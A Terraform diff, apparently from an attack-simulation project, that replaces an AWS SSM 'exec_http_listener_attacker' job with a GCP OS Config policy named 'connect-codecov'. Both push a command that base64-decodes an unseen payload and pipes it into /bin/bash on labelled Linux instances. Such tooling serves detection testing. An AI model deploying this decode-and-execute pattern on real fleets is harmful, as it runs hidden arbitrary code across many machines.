@@ -69,65 +69,59 @@ locals {
     base64_payload = base64encode(local.payload)
 }
 
-resource "aws_ssm_document" "exec_http_listener_attacker" {
-  name          = "exec_http_listener_${var.environment}_${var.deployment}"
-  document_type = "Command"
+resource "google_os_config_os_policy_assignment" "install-lacework-agent" {
 
-  content = jsonencode(
-    {
-        "schemaVersion": "2.2",
-        "description": "exec http listener attacker",
-        "mainSteps": [
-            {
-                "action": "aws:runShellScript",
-                "name": "exec_http_listener_attacker_${var.environment}_${var.deployment}",
-                "precondition": {
-                    "StringEquals": [
-                        "platformType",
-                        "Linux"
-                    ]
-                },
-                "inputs": {
-                    "timeoutSeconds": "600",
-                    "runCommand": [
-                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
-                    ]
-                }
-            }
-        ]
-    })
-}
+  project     = var.gcp_project_id
+  location    = data.google_compute_zones.available.names[0]
+  
+  name        = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
+  description = "Connect codecov"
+  skip_await_rollout = true
+  
+  instance_filter {
+    all = false
 
-resource "aws_resourcegroups_group" "exec_http_listener_attacker" {
-    name = "exec_http_listener_${var.environment}_${var.deployment}"
-
-    resource_query {
-        query = jsonencode(var.resource_query_exec_http_listener_attacker)
+    inclusion_labels {
+      labels = var.label
     }
 
-    tags = {
-        billing = var.environment
-        owner   = "lacework"
-    }
-}
-
-resource "aws_ssm_association" "exec_http_listener_attacker" {
-    association_name = "exec_http_listener_${var.environment}_${var.deployment}"
-
-    name = aws_ssm_document.exec_http_listener_attacker.name
-
-    targets {
-        key = "resource-groups:Name"
-        values = [
-            aws_resourcegroups_group.exec_http_listener_attacker.name,
-        ]
+    inventories {
+      os_short_name = "ubuntu"
     }
 
-    compliance_severity = "HIGH"
+    inventories {
+      os_short_name = "debian"
+    }
 
-    # every 30 minutes
-    schedule_expression = "cron(0/30 * * * ? *)"
-    
-    # will apply when updated and interval when false
-    apply_only_at_cron_interval = false
+  }
+
+  os_policies {
+    id   = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
+    mode = "ENFORCEMENT"
+
+    resource_groups {
+      resources {
+        id = "run"
+        exec {
+          validate {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "if false; then exit 100; else exit 101; fi"
+          }
+          enforce {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
+          }
+        }
+      }
+    }
+  }
+
+  rollout {
+    disruption_budget {
+      percent = 100
+    }
+    min_wait_duration = "600s"
+  }
 }
